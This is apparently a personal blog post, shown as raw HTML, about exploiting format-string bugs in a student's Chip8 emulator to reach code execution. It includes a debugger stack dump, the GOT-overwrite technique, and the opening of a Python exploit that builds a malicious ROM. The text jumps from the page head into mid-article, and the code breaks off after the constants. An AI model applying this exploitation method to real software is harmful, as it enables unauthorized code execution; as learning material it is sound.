<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <meta name="description" content="I exploit multiple vulnerabilities in a student's Chip8 emulator project as if it was a CTF, and obtain RCE">
    <meta property="og:description" content="I exploit multiple vulnerabilities in a student's Chip8 emulator project as if it was a CTF, and obtain RCE" />
    

    <meta property="og:title" content="Pwning the Chip8 Emulator with Blind Format Strings" />
    
    <meta property="og:type" content="article" />
    
    <meta property="og:url" content="/blog/pwning-the-chip8-emulator-with-blind-format-strings" />
    <meta property="og:image" content="http://localhost:4000/images/pic.jpg">
    <meta property="og:site_name" content="Luca's Blog">
    <meta name="twitter:card" content="summary_large_image">

    <meta name="twitter:site" content="@lucabtz_">


    <title>Pwning the Chip8 Emulator with Blind Format Strings - Luca's Blog</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="/assets/styles/main.css">

08:0040│ rbp 0x7ffc39a50a40 —▸ 0x405038 (puts@got[plt]) —▸ 0x7ff7b0eb8e60 (puts) ◂— push r14
09:0048│+008 0x7ffc39a50a48 —▸ 0x7ff7b0e68dba (__libc_start_call_main+122) ◂— mov edi, eax
0a:0050│+010 0x7ffc39a50a50 ◂— 0x3ada368abac064c3
0b:0058│+018 0x7ffc39a50a58 —▸ 0x4012d6 (main) ◂— push rbp
0c:0060│+020 0x7ffc39a50a60 ◂— 0x2bac064c3
0d:0068│+028 0x7ffc39a50a68 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
0e:0070│+030 0x7ffc39a50a70 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
</code></pre></div></div>
<p>As you can see we both have the leak address and the <code class="language-plaintext highlighter-rouge">puts</code> GOT address somewhere on the stack now.</p>

<p>Now comes the annoying part: we need to generate the format string that will overwrite the GOT entry ourself in the chip8
program. Ideally one would use the format <code class="language-plaintext highlighter-rouge">%&lt;value to write in decimal ascii&gt;c</code> to load the value in the character counter.
However converting to decimal is not so easy as there is no division operation on the chip8.</p>

<p>What I ended up doing is checking the values bit by bit and adding the format strings <code class="language-plaintext highlighter-rouge">%1$&lt;some power of 2&gt;c</code>: for example the
binary number <code class="language-plaintext highlighter-rouge">1011</code> would convert to <code class="language-plaintext highlighter-rouge">%1$1c%1$2c%1$8c</code>. I also spitted the write in two steps as this seemed to work better
and it also produce smaller format strings, so each time I write only 16 bits using the format <code class="language-plaintext highlighter-rouge">%14$hn</code> (<code class="language-plaintext highlighter-rouge">14</code> references the
pointer to <code class="language-plaintext highlighter-rouge">puts@got[plt]</code> we previously written on the stack). Splitting the write in two also means we need to update this 
before the second write.</p>

<p>After this is done the exploit is completed using again the arbitrary call primitive to call <code class="language-plaintext highlighter-rouge">puts@plt</code> with any command we
want to run as first argument.</p>

<h2 id="conclusion">Conclusion</h2>
<p>The exploit works fully reliably, however, unless the output of the program is piped into <code class="language-plaintext highlighter-rouge">/dev/null</code> it is extremely slow as
a lot of characters need to actually be printed. This was just a learning project anyhow and I learned a lot about format string
exploits along the way, I hope at the end of this journey you have learned something to, dear reader.
Anyhow here is the exploit code which will generate a malicious ROM that spawns a calculator</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pwn</span>

<span class="c1"># pwndbg&gt; ptype /o struct Chip8
#/* offset      |    size */  type = struct Chip8 {
#/*      0      |    4096 */    uint8_t memory[4096];
#/*   4096      |    2048 */    uint8_t display[2048];
#/*   6144      |       2 */    uint16_t pc;
#/*   6146      |       2 */    uint16_t index;
#/*   6148      |      32 */    uint16_t stack[16];
#/*   6180      |       1 */    uint8_t stack_pointer;
#/*   6181      |       1 */    uint8_t delay;
#/*   6182      |       1 */    uint8_t sound;
#/*   6183      |      16 */    uint8_t registers[16];
#/* XXX  1-byte hole      */
#/*   6200      |       2 */    uint16_t op_code;
#/*   6202      |       1 */    uint8_t draw_flag;
#/*   6203      |       1 */    uint8_t draw_wait;
#/*   6204      |      16 */    uint8_t input[16];
#
#                               /* total size (bytes): 6220 */
#                             }
</span>

<span class="n">ROM_START_OFFSET</span>   <span class="o">=</span> <span class="mh">0x200</span>
<span class="n">PRINTF_LEAK_OFFSET</span> <span class="o">=</span> <span class="mh">0x100</span>

<span class="c1"># chip struct offsets from rom start
</span><span class="n">PC_OFFSET</span>          <span class="o">=</span> <span class="mi">6144</span> <span class="o">-</span> <span class="mh">0x200</span>
<span class="n">SP_OFFSET</span>          <span class="o">=</span> <span class="mi">6180</span> <span class="o">-</span> <span class="mh">0x200</span>
<span class="n">CHIP_STRUCT_SIZE</span>   <span class="o">=</span> <span class="mi">6220</span>

<span class="n">MUSIC_ADDR</span>         <span class="o">=</span> <span class="mh">0x406990</span>
